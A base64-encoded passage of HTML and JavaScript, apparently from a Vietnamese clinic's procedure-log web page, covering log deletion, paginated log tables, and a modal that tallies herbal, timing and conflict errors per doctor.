h7DQogICAgcGF0aDogbG9nUGF0aCwNCiAgICBjb250ZW50czogSlNPTi5zdHJpbmdpZnkobG9ncywgbnVsbCwgMiksDQogICAgbW9kZTogeyAnLnRhZyc6ICdvdmVyd3JpdGUnIH0sDQogICAgYXV0b3JlbmFtZTogZmFsc2UNCiAgfSk7DQp9DQoNCg0KYXN5bmMgZnVuY3Rpb24gb25EZWxldGVMb2dSb3coaW5kZXhJbkxvZ3MsIGN1cnJlbnRVc2VyKSB7DQogIC8vIE7hur91IGtow7RuZyBwaOG6o2kgZG9jdG9yIOKGkiBwb3B1cCBj4bqlbSB4b8OhLCBjaOG7iSBjw7MgMSBuw7p0IEh14bu3DQogIGlmIChjdXJyZW50VXNlciAhPT0gJ2RvY3RvcicpIHsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoDQogICAgICAn4p2MIMOKIGzDoG0gY8OhaSBnw6wgxJHhuqV5eXl5IGVtIMahaS4gPGJyLz5E4burbmcgbOG6oWkgbmdheSwgcXXDoSBuZ3V5IGhp4buDbS4nLA0KICAgICAgdHJ1ZSAvLyA8LS0gY2jhur8gxJHhu5kgMSBuw7p0DQogICAgKTsNCiAgICByZXR1cm47DQogIH0NCg0KICAvLyBO4bq/dSBsw6AgZG9jdG9yIOKGkiBwb3B1cCB4w6FjIG5o4bqtbiB4b8OhICgyIG7DunQpDQogIGNvbnN0IG9rID0gYXdhaXQgY29uZmlybURlbGV0ZVBvcHVwKA0KICAgICdC4bqhbiBjw7MgY2jhuq9jIG114buRbiB4b8OhIG3hu6VjIG7DoHk/JywNCiAgICBmYWxzZQ0KICApOw0KICBpZiAoIW9rKSByZXR1cm47DQoNCiAgdHJ5IHsNCiAgICBhd2FpdCBkZWxldGVMb2dBbmRGaWxlX0J5SW5kZXgoaW5kZXhJbkxvZ3MpOw0KICAgIGF3YWl0IGNvbmZpcm1EZWxldGVQb3B1cCgn4pyFIMSQw6MgeG/DoSB0aMOgbmggY8O0bmchJywgdHJ1ZSk7DQogICAgYXdhaXQgc2hvd0Ryb3Bib3hQYW5lbCgpOw0KICB9IGNhdGNoIChlKSB7DQogICAgY29uc29sZS5lcnJvcihlKTsNCiAgICBhd2FpdCBjb25maXJtRGVsZXRlUG9wdXAoJ+KaoO+4jyBDw7MgbOG7l2kga2hpIHhvw6EuIFZ1aSBsw7JuZyB0aOG7rSBs4bqhaS4nLCB0cnVlKTsNCiAgfQ0KfQ0KDQovLyDEkMOzbmcgcGFuZWwga2hpIGLhuqVtIEVTQyBob+G6t2MgY2xpY2sgcmEgbmdvw6BpDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJrZXlkb3duIiwgZnVuY3Rpb24oZSkgew0KICBpZiAoZS5rZXkgPT09ICJFc2NhcGUiKSB7DQogICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoImRyb3Bib3hQYW5lbCIpLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogIH0NCn0pOw0KDQpkb2N1bWVudC5hZGRFdmVudExpc3RlbmVyKCJjbGljayIsIGZ1bmN0aW9uKGUpIHsNCiAgY29uc3QgcGFuZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiZHJvcGJveFBhbmVsIik7DQogIGlmIChwYW5lbC5zdHlsZS5kaXNwbGF5ID09PSAiYmxvY2siIHx8IHBhbmVsLnN0eWxlLmRpc3BsYXkgPT09ICJmbGV4Iikgew0KICAgIGNvbnN0IGNvbnRlbnQgPSBwYW5lbC5xdWVyeVNlbGVjdG9yKCJkaXYiKTsNCiAgICAvLyBO4bq/dSBjbGljayBuZ2/DoGkgdsO5bmcgbuG7mWkgZHVuZyBwYW5lbA0KICAgIGlmICghY29udGVudC5jb250YWlucyhlLnRhcmdldCkpIHsNCiAgICAgIHBhbmVsLnN0eWxlLmRpc3BsYXkgPSAibm9uZSI7DQogICAgfQ0KICB9DQp9KTsNCg0KPC9zY3JpcHQ+DQo8c2NyaXB0Pg0KLy8gPT09PT09IFBIw4JOIFRSQU5HIELhuqJORyBMT0cgVFJPTkcgUE9QVVAgPT09PT09DQpsZXQgREJfTE9HUyA9IFtdOyAgICAgICAvLyB0b8OgbiBi4buZIGxvZ3MgxJHDoyB04bqjaQ0KbGV0IERCX1BBR0UgPSAxOyAgICAgICAgLy8gdHJhbmcgaGnhu4duIHThuqFpDQpsZXQgREJfUEFHRV9TSVpFID0gMTA7ICAvLyBz4buRIGTDsm5nIC8gdHJhbmcNCmxldCBEQl9DVVJSRU5UX1VTRVIgPSAnJzsgLy8gdXNlciDEkWFuZyDEkcSDbmcgbmjhuq1wIChsb3dlcmNhc2UpIMSR4buDIHJlbmRlciBuw7p0IFhvw6ENCg0KZnVuY3Rpb24gc2V0UGFnZVNpemUoc2l6ZSl7DQogIERCX1BBR0VfU0laRSA9IE51bWJlcihzaXplKSB8fCAxMDsNCiAgREJfUEFHRSA9IDE7DQogIHJlbmRlckRyb3Bib3hQYWdlKCk7DQp9DQoNCmZ1bmN0aW9uIGdvVG9QYWdlKHApew0KICBjb25zdCBtYXggPSBNYXRoLm1heCgxLCBNYXRoLmNlaWwoREJfTE9HUy5sZW5ndGggLyBEQl9QQUdFX1NJWkUpKTsNCiAgREJfUEFHRSA9IE1hdGgubWluKE1hdGgubWF4KDEsIHApLCBtYXgpOw0KICByZW5kZXJEcm9wYm94UGFnZSgpOw0KfQ0KDQpmdW5jdGlvbiByZW5kZXJEcm9wYm94UGFnZSgpew0KICBjb25zdCB0Ym9keSA9IGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdkcm9wYm94RmlsZUxpc3QnKTsNCiAgY29uc3QgcGFnZUJ0bnMgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VCdXR0b25zJyk7DQogIGNvbnN0IHBhZ2VJbmZvID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2Ryb3Bib3hQYWdlSW5mbycpOw0KDQogIGlmKCF0Ym9keSkgcmV0dXJuOw0KDQogIC8vIHLhu5duZz8NCiAgaWYoIUFycmF5LmlzQXJyYXkoREJfTE9HUykgfHwgREJfTE9HUy5sZW5ndGggPT09IDApew0KICAgIHRib2R5LmlubmVySFRNTCA9IGA8dHI+PHRkIGNvbHNwYW49IjYiIHN0eWxlPSJ0ZXh0LWFsaWduOmNlbnRlcjtjb2xvcjpyZWQiPktow7RuZyBjw7MgZGFuaCBzw6FjaCBuw6BvIMSRxrDhu6NjIGzGsHU8L3RkPjwvdHI+YDsNCiAgICBpZihwYWdlQnRucykgcGFnZUJ0bnMuaW5uZXJIVE1MID0gJyc7DQogICAgaWYocGFnZUluZm8pIHBhZ2VJbmZvLnRleHRDb250ZW50ID0gJyc7DQogICAgcmV0dXJuOw0KICB9DQoNCiAgY29uc3QgdG90YWwgPSBEQl9MT0dTLmxlbmd0aDsNCiAgY29uc3QgbWF4UGFnZSA9IE1hdGgubWF4KDEsIE1hdGguY2VpbCh0b3RhbCAvIERCX1BBR0VfU0laRSkpOw0KICBpZihEQl9QQUdFID4gbWF4UGFnZSkgREJfUEFHRSA9IG1heFBhZ2U7DQoNCiAgY29uc3Qgc3RhcnRJZHggPSAoREJfUEFHRSAtIDEpICogREJfUEFHRV9TSVpFOw0KICBjb25zdCBlbmRJZHggICA9IE1hdGgubWluKHN0YXJ0SWR4ICsgREJfUEFHRV9TSVpFLCB0b3RhbCk7DQogIGNvbnN0IHNsaWNlICAgID0gREJfTE9HUy5zbGljZShzdGFydElkeCwgZW5kSWR4KTsNCg0KICAvLyBSZW5kZXIgYm9keSB0aGVvIHRyYW5nDQogIHRib2R5LmlubmVySFRNTCA9IHNsaWNlLm1hcCgoaXRlbSwgaSkgPT4gYA0KICAgIDx0cj4NCiAgICAgIDx0ZD4ke3N0YXJ0SWR4ICsgaSArIDF9PC90ZD4NCiAgICAgIDx0ZD4ke2l0ZW0ua2hvYSB8fCAnJ308L3RkPg0KICAgICAgPHRkPiR7KGl0ZW0ubmdheSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzAwOjAwOjAwJywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJzIzOjU5OjU5JywnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJ1Thu6snLCcnKQ0KICAgICAgICAgICAucmVwbGFjZSgnxJHhur9uJywnIC0+ICcpDQogICAgICAgICAgIC5yZXBsYWNlKC9ccysvZywnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCgkJICAgDQoJCSAgIDx0ZD4ke051bWJlcihpdGVtLmhlcmJfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgIDx0ZD4ke051bWJlcihpdGVtLnRpbWVfZXJyb3JzIHx8IDApfTwvdGQ+DQogICAgPHRkPiR7TnVtYmVyKGl0ZW0uY29uZmxpY3RfZXJyb3JzIHx8IDApfTwvdGQ+DQoJCSAgIA0KICAgICAgPHRkPiR7KGl0ZW0udGltZSB8fCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJywnLCAnJykNCiAgICAgICAgICAgLnJlcGxhY2UoJyAnLCAnIC0gJykNCiAgICAgICAgICAgLnJlcGxhY2UoL1xzKy9nLCAnICcpDQogICAgICAgICAgIC50cmltKCl9PC90ZD4NCiAgICAgIDx0ZD48YSBocmVmPSJqYXZhc2NyaXB0OnZvaWQoMCkiIG9uY2xpY2s9InZlcmlmeUFuZE9wZW5MaW5rKCcke2l0ZW0ubGlua30nKSI+WGVtPC9hPjwvdGQ+DQogICAgICA8dGQ+DQogICAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgc3R5bGU9ImJhY2tncm91bmQ6I2U3NGMzYzsgcGFkZGluZzoxMHB4IDE0cHg7IGZvbnQtc2l6ZToxMnB4OyINCiAgICAgICAgICBvbmNsaWNrPSJvbkRlbGV0ZUxvZ1Jvdygke3N0YXJ0SWR4ICsgaX0sICcke0RCX0NVUlJFTlRfVVNFUn0nKSI+DQogICAgICAgICAgPGkgY2xhc3M9ImZhIGZhLXRyYXNoIj48L2k+IFhvw6ENCiAgICAgICAgPC9idXR0b24+DQogICAgICA8L3RkPg0KICAgIDwvdHI+DQogIGApLmpvaW4oJycpOw0KDQogIC8vIFJlbmRlciBuw7p0IHRyYW5nIChQcmV2IOKApiBOZXh0KSDigJQgaGnhu4NuIHRo4buLIGThuqNpIHThu5FpIMSRYSA3IG7DunQgc+G7kQ0KICBpZihwYWdlQnRucyl7DQogICAgY29uc3QgYnRuID0gKGxhYmVsLCB0YXJnZXQsIGRpc2FibGVkPWZhbHNlLCB0aXRsZT0nJykgPT4NCiAgICAgIGA8YnV0dG9uIGNsYXNzPSJidG4iICR7ZGlzYWJsZWQ/J2Rpc2FibGVkJzonJ30gdGl0bGU9IiR7dGl0bGV9Ig0KICAgICAgICAgICAgICAgc3R5bGU9InBhZGRpbmc6NnB4IDEwcHgke2Rpc2FibGVkPyc7b3BhY2l0eTouNjtjdXJzb3I6bm90LWFsbG93ZWQnOicnfSINCiAgICAgICAgICAgICAgIG9uY2xpY2s9ImdvVG9QYWdlKCR7dGFyZ2V0fSkiPiR7bGFiZWx9PC9idXR0b24+YDsNCg0KICAgIGNvbnN0IHJhbmdlID0gMzsgLy8gaGFpIGLDqm4gdHJhbmcgaGnhu4duIHThuqFpDQogICAgY29uc3QgZnJvbSAgPSBNYXRoLm1heCgxLCBEQl9QQUdFIC0gcmFuZ2UpOw0KICAgIGNvbnN0IHRvICAgID0gTWF0aC5taW4obWF4UGFnZSwgREJfUEFHRSArIHJhbmdlKTsNCg0KICAgIGxldCBodG1sID0gJyc7DQogICAgaHRtbCArPSBidG4oJ8KrIMSQ4bqndScsIDEsIERCX1BBR0U9PT0xLCAnVHJhbmcgxJHhuqd1Jyk7DQogICAgaHRtbCArPSBidG4oJ+KAuSBUcsaw4bubYycsIERCX1BBR0UtMSwgREJfUEFHRT09PTEsICdUcmFuZyB0csaw4bubYycpOw0KICAgIGZvcihsZXQgcCA9IGZyb207IHAgPD0gdG87IHArKyl7DQogICAgICBodG1sICs9IGA8YnV0dG9uIGNsYXNzPSJidG4iIG9uY2xpY2s9ImdvVG9QYWdlKCR7cH0pIg0KICAgICAgICAgICAgICAgICBzdHlsZT0icGFkZGluZzo2cHggMTBweDske3A9PT1EQl9QQUdFPydiYWNrZ3JvdW5kOiMyZWNjNzEnOicnfSI+DQogICAgICAgICAgICAgICAgICR7cH0NCiAgICAgICAgICAgICAgIDwvYnV0dG9uPmA7DQogICAgfQ0KICAgIGh0bWwgKz0gYnRuKCdTYXUg4oC6JywgREJfUEFHRSsxLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIHNhdScpOw0KICAgIGh0bWwgKz0gYnRuKCdDdeG7kWkgwrsnLCBtYXhQYWdlLCBEQl9QQUdFPT09bWF4UGFnZSwgJ1RyYW5nIGN14buRaScpOw0KDQogICAgcGFnZUJ0bnMuaW5uZXJIVE1MID0gaHRtbDsNCiAgfQ0KDQogIGlmKHBhZ2VJbmZvKXsNCiAgICBwYWdlSW5mby50ZXh0Q29udGVudCA9IGBUcmFuZyAke0RCX1BBR0V9LyR7bWF4UGFnZX0g4oCiICR7c3RhcnRJZHgrMX0tJHtlbmRJZHh9LyR7dG90YWx9YDsNCiAgfQ0KfQ0KDQovLyBH4bqvbiBz4buxIGtp4buHbiDEkeG7lWkgcGFnZSBzaXplIChjaOG7iSBj4bqnbiBn4buNaSAxIGzhuqduIHNhdSBraGkgcG9wdXAgbeG7nykNCmZ1bmN0aW9uIGF0dGFjaFBhZ2VyRXZlbnRzT25jZSgpew0KICBjb25zdCBzZWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnZHJvcGJveFBhZ2VTaXplJyk7DQogIGlmKHNlbCAmJiAhc2VsLmRhdGFzZXQuYm91bmQpew0KICAgIHNlbC5kYXRhc2V0LmJvdW5kID0gJzEnOw0KICAgIHNlbC5hZGRFdmVudExpc3RlbmVyKCdjaGFuZ2UnLCBlID0+IHNldFBhZ2VTaXplKGUudGFyZ2V0LnZhbHVlKSk7DQogIH0NCn0NCjwvc2NyaXB0Pg0KDQoNCjwhLS0gUE9QVVAgVMOTTSBU4bquVCBM4buWSSAtLT4NCjxkaXYgaWQ9InN1bW1hcnlNb2RhbCIgc3R5bGU9ImRpc3BsYXk6bm9uZTtwb3NpdGlvbjpmaXhlZDtpbnNldDowO3otaW5kZXg6MTEwNTAiPg0KICA8ZGl2IGlkPSJzdW1tYXJ5QmFja2Ryb3AiIHN0eWxlPSJwb3NpdGlvbjphYnNvbHV0ZTtpbnNldDowO2JhY2tncm91bmQ6cmdiYSgwLDAsMCwwLjUpIj48L2Rpdj4NCiAgPGRpdiByb2xlPSJkaWFsb2ciIGFyaWEtbW9kYWw9InRydWUiDQogICAgICAgc3R5bGU9InBvc2l0aW9uOmFic29sdXRlO3RvcDo2JTtsZWZ0OjUwJTt0cmFuc2Zvcm06dHJhbnNsYXRlWCgtNTAlKTsNCiAgICAgICAgICAgICAgd2lkdGg6bWluKDkwMHB4LDkydncpO21heC1oZWlnaHQ6ODZ2aDtvdmVyZmxvdzphdXRvOw0KICAgICAgICAgICAgICBiYWNrZ3JvdW5kOiNmZmY7Y29sb3I6IzAwMDtib3JkZXItcmFkaXVzOjEwcHg7Ym9yZGVyOjJweCBzb2xpZCAjMzQ5OGRiOw0KICAgICAgICAgICAgICBib3gtc2hhZG93OjAgOHB4IDI0cHggcmdiYSgwLDAsMCwuMjUpO2ZvbnQtZmFtaWx5OkludGVyLHNhbnMtc2VyaWYiPg0KICAgIDxkaXYgc3R5bGU9ImRpc3BsYXk6ZmxleDthbGlnbi1pdGVtczpjZW50ZXI7anVzdGlmeS1jb250ZW50OnNwYWNlLWJldHdlZW47cGFkZGluZzoxNHB4IDE2cHg7Ym9yZGVyLWJvdHRvbToxcHggc29saWQgI2U1ZTdlYiI+DQogICAgICA8aDMgc3R5bGU9Im1hcmdpbjowO2ZvbnQtc2l6ZToxOHB4Ij5Uw7NtIFThuq90IEzhu5dpPC9oMz4NCiAgICAgIDxidXR0b24gY2xhc3M9ImJ0biIgdHlwZT0iYnV0dG9uIiBpZD0ic3VtbWFyeUNsb3NlQnRuIj7EkMOzbmc8L2J1dHRvbj4NCiAgICA8L2Rpdj4NCiAgICA8ZGl2IGlkPSJzdW1tYXJ5Q29udGVudCIgc3R5bGU9InBhZGRpbmc6MTZweCAxOHB4O2ZvbnQtc2l6ZToxNHB4O2xpbmUtaGVpZ2h0OjEuNSI+PC9kaXY+DQogIDwvZGl2Pg0KPC9kaXY+DQo8c2NyaXB0Pg0KLy8gPT09PT0gVMOTTSBU4bquVCBM4buWSSAoU+G6r2MgdGh14buRYyAvIFNhaSB0aOG7nWkgZ2lhbiAvIFRyw7luZyBnaeG7nSkgPT09PT0NCihmdW5jdGlvbigpew0KICAvLyBDaHXhuqluIGhvw6EgdMOqbiBoaeG7g24gdGjhu4sNCiAgZnVuY3Rpb24gY2xlYW4ocyl7IHJldHVybiAoc3x8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvLC9nLCcnKS5yZXBsYWNlKC9ccysvZywnICcpLnRyaW0oKTsgfQ0KDQogIC8vIEdvbSBuaMOzbTogeyBbZG9jdG9yXTogeyB0b3RhbDogbnVtYmVyLCBieU9wZXJhdG9yOiBNYXA8b3AsIGNvdW50PiB9IH0NCiAgZnVuY3Rpb24gbWFrZUJ1Y2tldCgpeyByZXR1cm4geyB0b3RhbDowLCBieU9wZXJhdG9yOm5ldyBNYXAoKSB9OyB9DQogZnVuY3Rpb24gYnVtcChidWNrZXRNYXAsIGRvY3Rvciwgb3BlcmF0b3Ipew0KICBjb25zdCBkID0gKGRvY3Rvcnx8JycpLnRvU3RyaW5nKCkucmVwbGFjZSgvLC9nLCcnKS50cmltKCkgfHwgJ0tow7RuZyBjw7MnOw0KICBjb25zdCBvID0gKG9wZXJhdG9yfHwnJykudG9TdHJpbmcoKS5yZXBsYWNlKC8sL2csJycpLnRyaW0oKSB8fCAnS2jDtG5nIGPDsyc7DQogIGlmKCFidWNrZXRNYXAuaGFzKGQpKSBidWNrZXRNYXAuc2V0KGQsIHsgdG90YWw6MCwgYnlPcGVyYXRvcjpuZXcgTWFwKCkgfSk7DQogIGNvbnN0IGIgPSBidWNrZXRNYXAuZ2V0KGQpOw0KICBiLnRvdGFsKys7DQogIGIuYnlPcGVyYXRvci5zZXQobywgKGIuYnlPcGVyYXRvci5nZXQobyl8fDApKzEpOw0KfQ0KDQogIC8vIDEpIMSQ4bq/bSBT4bquQyBUSFXhu5BDIFRIQU5HDQpmdW5jdGlvbiBjb3VudEhlcmIoKXsNCiAgY29uc3QgaGVyYnMgPSBBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxIZXJiUHJvY2VkdXJlcykgPyB3aW5kb3cuYWxsSGVyYlByb2NlZHVyZXMgOiBbXTsNCiAgY29uc3Qgbm9ybSA9IHMgPT4gKHN8fCcnKS50b1N0cmluZygpLnJlcGxhY2UoL1ss77yMXStccyokLywnJykucmVwbGFjZSgvXHMrL2csJyAnKS50cmltKCkudG9Mb3dlckNhc2UoKTsNCg0KICAvLyAxKSDEkOG6v20gdOG6p24gc3XhuqV0IG5nxrDhu51pIHRo4buxYyBoaeG7h24gdGhlbyB04burbmcgbmfDoHkNCiAgY29uc3QgYnlEYXRlID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgaGVyYnMuZm9yRWFjaChoPT57DQogICAgY29uc3QgZCA9IGguZGF0ZTsNCiAgICBjb25zdCBvcCA9IG5vcm0oaC5vcGVyYXRvcik7DQogICAgaWYoIW9wIHx8IG9wID09PSAna2jDtG5nIGPDsycpIHJldHVybjsgICAgICAgICAgICAvLyBi4buPIHRy4buRbmcva2jDtG5nIGPDsw0KICAgIChieURhdGVbZF18fChieURhdGVbZF09T2JqZWN0LmNyZWF0ZShudWxsKSkpW29wXSA9IChieURhdGVbZF1bb3BdfHwwKSArIDE7DQogIH0pOw0KDQogIC8vIDIpIFTDrW5oICLEkWEgc+G7kSIgKHRvcCBwaOG6o2kgbOG7m24gaMahbiBzZWNvbmQpDQogIGNvbnN0IG1ham9yaXR5ID0gT2JqZWN0LmNyZWF0ZShudWxsKTsNCiAgT2JqZWN0LmtleXMoYnlEYXRlKS5mb3JFYWNoKGQ9PnsNCiAgICBjb25zdCBhcnIgPSBPYmplY3QuZW50cmllcyhieURhdGVbZF0pLnNvcnQoKGEsYik9PmJbMV0tYVsxXSk7DQogICAgY29uc3QgdG9wICAgID0gYXJyWzBdIHx8IFtudWxsLDBdOw0KICAgIGNvbnN0IHNlY29uZCA9IGFyclsxXSB8fCBbbnVsbCwwXTsNCiAgICBtYWpvcml0eVtkXSA9IHsgdG9wOiB0b3BbMF0sIHRvcENvdW50OiB0b3BbMV0sIHNlY29uZENvdW50OiBzZWNvbmRbMV0gfTsNCiAgfSk7DQoNCiAgLy8gMykgQ2jhu4kgY+G7mW5nIG5o4buvbmcgY2EgS0jDgUMgxJBBIFPhu5AsIGdvbSB0aGVvIELDoWMgc8SpIGNo4buJIMSR4buLbmggKGPDonkgY2jDrW5oKQ0KICBjb25zdCBtYXAgPSBuZXcgTWFwKCk7IC8vIHsgZG9jdG9yID0+IHt0b3RhbCwgYnlPcGVyYXRvcn0gfSAgKGJ5T3BlcmF0b3Igc+G6vSBraMO0bmcgaGnhu4NuIHRo4buLKQ0KICBoZXJicy5mb3JFYWNoKGg9PnsNCiAgICBjb25zdCBkID0gaC5kYXRlOw0KICAgIGNvbnN0IG9wID0gbm9ybShoLm9wZXJhdG9yKTsNCiAgICBpZighb3AgfHwgb3AgPT09ICdraMO0bmcgY8OzJykgcmV0dXJuOw0KICAgIGNvbnN0IG0gPSBtYWpvcml0eVtkXTsNCiAgICBpZighbSkgcmV0dXJuOw0KICAgIGlmKG0udG9wICYmIG0udG9wQ291bnQgPiBtLnNlY29uZENvdW50ICYmIG9wICE9PSBtLnRvcCl7DQogICAgICAvLyBjaOG7iSB0w61uaCB0aGVvIGLDoWMgc8SpIGNo4buJIMSR4buLbmggKGPDonkgY2jDrW5oKQ0KICAgICAgYnVtcChtYXAsIGguZG9jdG9yLCAnJyk7ICAvLyAnYnlPcGVyYXRvcicgc+G6vSBi4buLIOG6qW4g4bufIHBo4bqnbiByZW5kZXINCiAgICB9DQogIH0pOw0KDQogIHJldHVybiBtYXA7DQp9DQoNCiAgLy8gMikgxJDhur9tIFNBSSBUSOG7nEkgR0lBTiAobeG7jWkgbOG7l2kgdHJvbmcgZXJyb3JMb2cgY29pIGzDoCBs4buXaSB0aOG7nWkgZ2lhbikNCiBmdW5jdGlvbiBjb3VudFRpbWVFcnJvcnMoKXsNCiAgY29uc3QgbWFwID0gbmV3IE1hcCgpOw0KDQogIC8vIEzhuqV5IHThu6sgbeG6o25nIGVycm9yTG9nIChraeG7g3UgbGV0IHRvw6BuIGPhu6VjKQ0KICBjb25zdCBsaXN0ID0NCiAgICAodHlwZW9mIGVycm9yTG9nICE9PSAndW5kZWZpbmVkJyAmJiBBcnJheS5pc0FycmF5KGVycm9yTG9nKSkgPyBlcnJvckxvZyA6DQogICAgKEFycmF5LmlzQXJyYXkod2luZG93LmVycm9yTG9nKSA/IHdpbmRvdy5lcnJvckxvZyA6IFtdKTsNCg0KICAvLyBDaOG7iSBs4bqleSBs4buXaSBs4buHY2ggdGjhu51pIGzGsOG7o25nIChjw7MgZXhwZWN0ZWQvYWN0dWFsKQ0KICBsaXN0LmZvckVhY2goZSA9PiB7DQogICAgY29uc3QgZCA9IGUgJiYgZS5kZXRhaWxzOw0KICAgIGlmICghZCkgcmV0dXJuOw0KICAgIGlmICh0eXBlb2YgZC5leHBlY3RlZCA9PT0gJ251bWJlcicgJiYgdHlwZW9mIGQuYWN0dWFsID09PSAnbnVtYmVyJykgew0KICAgICAgYnVtcChtYXAsIGQuZG9jdG9yLCBkLm9wZXJhdG9yKTsNCiAgICB9DQogIH0pOw0KDQogIC8vIEZhbGxiYWNrOiDEkeG7jWMgdHLhu7FjIHRp4bq/cCB04burIGLhuqNuZyBs4buXaSB0aOG7nWkgZ2lhbiBu4bq/dSB2w6wgbMO9IGRvIG7DoG8gxJHDsyBt4bqjbmcgcuG7l25nDQogIGlmIChtYXAuc2l6ZSA9PT0gMCkgew0KICAgIGRvY3VtZW50LnF1ZXJ5U2VsZWN0b3JBbGwoJyNlcnJvckxvZyB0ci5lcnJvci1yb3cnKS5mb3JFYWNoKHRyID0+IHsNCiAgICAgIGNvbnN0IHRkcyA9IHRyLnF1ZXJ5U2VsZWN0b3JBbGwoJ3RkJyk7DQogICAgICAvLyBC4bqjbmcgY8OzIGPhu5l0OiBUw6puIEJOIHwgVGjhu6cgdGh14bqtdCB8IELDoWMgc+G7uSBjaOG7iSDEkeG7i25oIHwgTmfGsOG7nWkgdGjhu7FjIGhp4buHbiB8IFRo4budaSBnaWFuIHwgTOG7l2kNCiAgICAgIGNvbnN0IGRvY3RvciAgID0gdGRzWzJdPy50ZXh0Q29udGVudD8udHJpbSgpOw0KICAgICAgY29uc3Qgb3BlcmF0b3IgPSB0ZHNbM10/LnRleHRDb250ZW50Py50cmltKCk7DQogICAgICBpZiAoZG9jdG9yIHx8IG9wZXJhdG9yKSBidW1wKG1hcCwgZG9jdG9yLCBvcGVyYXRvcik7DQogICAgfSk7DQogIH0NCg0KICByZXR1cm4gbWFwOw0KfQ0KDQogIC8vIDMpIMSQ4bq/bSBUUsOZTkcgR0nhu5wgKHThu6sgYWxsUHJvY2VkdXJlcy5jb25mbGljdD10cnVlKQ0KZnVuY3Rpb24gY291bnRDb25mbGljdHMoKXsNCiAgY29uc3QgbGlzdCA9DQogICAgKHR5cGVvZiBhbGxQcm9jZWR1cmVzICE9PSAndW5kZWZpbmVkJyAmJiBBcnJheS5pc0FycmF5KGFsbFByb2NlZHVyZXMpKSA/IGFsbFByb2NlZHVyZXMgOg0KICAgIChBcnJheS5pc0FycmF5KHdpbmRvdy5hbGxQcm9jZWR1cmVzKSA/IHdpbmRvdy5hbGxQcm9jZWR1cmVzIDogW10pOw0KICBjb25zdCBtYXAgPSBuZXcgTWFwKCk7DQogIGxpc3QuZm9yRWFjaChwID0+IHsNCiAgICBpZiAocCAmJiBwLmNvbmZsaWN0KSBidW1wKG1hcCwgcC5kb2N0b3IsIHAub3BlcmF0b3IpOw0KICB9KTsNCiAgcmV0dXJuIG1hcDsNCn0NCmZ1bmN0aW9uIGJ1aWxkRG9jdG9yUmFua2luZyhoZXJiTWFwLCB0aW1lTWFwLCBjb25mTWFwKXsNCiAgY29uc3QgdG90YWxNYXAgPSBuZXcgTWFwKCk7DQoNCiAgLy8gZ+G7mXAgc+G7kSB04burIDMgbWFwDQogIGNvbnN0IG1lcmdlID0gKHNyYykgPT4gew0KICAgIHNyYy5mb3JFYWNoKChpbmZvLCBkb2MpPT57DQogICAgICBpZighdG90YWxNYXAuaGFzKGRvYykpIHRvdGFsTWFwLnNldChkb2Mse3RvdGFsOjB9KTsNCiAgICAgIHRvdGFsTWFwLmdldChkb2MpLnRvdGFsICs9IGluZm8udG90YWw7DQogICAgfSk7DQogIH07DQogIG1lcmdlKGhlcmJNYXApOyBtZXJnZSh0aW1lTWFwKTsgbWVyZ2UoY29uZk1hcCk7DQoNCiAgLy8gc29ydCBnaeG6o20gZOG6p24NCiAgY29uc3QgYXJyID0gQXJyYXkuZnJvbSh0b3RhbE1hcC5lbnRyaWVzKCkpLnNvcnQoKGEsYik9PmJbMV0udG90YWwgLSBhWzFdLnRvdGFsKTsNCg0KICBsZXQgaHRtbCA9IGA8ZGl2IGNsYXNzPSJzZWN0aW9uIj48ZGl2IGNsYXNzPSJpbm5lciI+YDsNCiAgaWYoYXJyLmxlbmd0aD09PTApew0KICAgIGh0bWwgKz0gYDxkaXYgY2xhc3M9Im5vdGUtZW1wdHkiPkNoxrBhIGPDsyBk4buvIGxp4buHdTwvZGl2PmA7DQogIH0gZWxzZSB7DQogICAgaHRtbCArPSBgPHRhYmxlIGNsYXNzPSJ0YWJsZS1jbGVhbiI+PHRoZWFkPjx0cj4NCiAgICAgICAgICAgICAgPHRoPkjhuqFuZzwvdGg+PHRoPkLDoWMgc8SpPC90aD4NCiAgICAgICAgICAgICAgPHRoIGNsYXNzPSJyaWdodCI+VOG7lW5nIGzhu5dpPC90aD4NCiAgICAgICAgICAgIDwvdHI+PC90aGVhZD48dGJvZHk+YDsNCiAgICBhcnIuZm9yRWFjaCgoW2RvYyxpbmZvXSxpKT0+ew0KICAgICAgaHRtbCArPSBgPHRyPg0KICAgICAgICA8dGQ+JHtpKzF9PC90ZD4NCiAgICAgICAgPHRkPjxiPiR7ZG9jfTwvYj48L3RkPg0KICAgICAgICA8dGQgY2xhc3M9InJpZ2h0Ij4ke2luZm8udG90YWx9PC90ZD4NCiAgICAgIDwvdHI+YDsNCiAgICB9KTsNCiAgICBodG1sICs9IGA8L3Rib2R5PjwvdGFibGU+YDsNCiAgfQ0KICBodG1sICs9IGA8L2Rpdj48L2Rpdj5gOw0KICByZXR1cm4gaHRtbDsNCn0NCiAgLy8gUmVuZGVyIDEgc2VjdGlvbg0KZnVuY3Rpb24gcmVuZGVyU2VjdGlvbih0aXRsZSwgbWFwLCBzaG93T3BlcmF0b3JzID0gdHJ1ZSl7DQogIGlmKCFtYXAgfHwgbWFwLnNpemU9PT0wKXsNCiAgICByZXR1cm4gYDxoNCBzdHlsZT0ibWFyZ2luOjEwcHggMCA2cHgiPiR7dGl0bGV9PC9oND48ZGl2PjxpPkNoxrBhIGPDsyBk4buvIGxp4buHdTwvaT48L2Rpdj5gOw0KICB9DQogIGNvbnN0IGR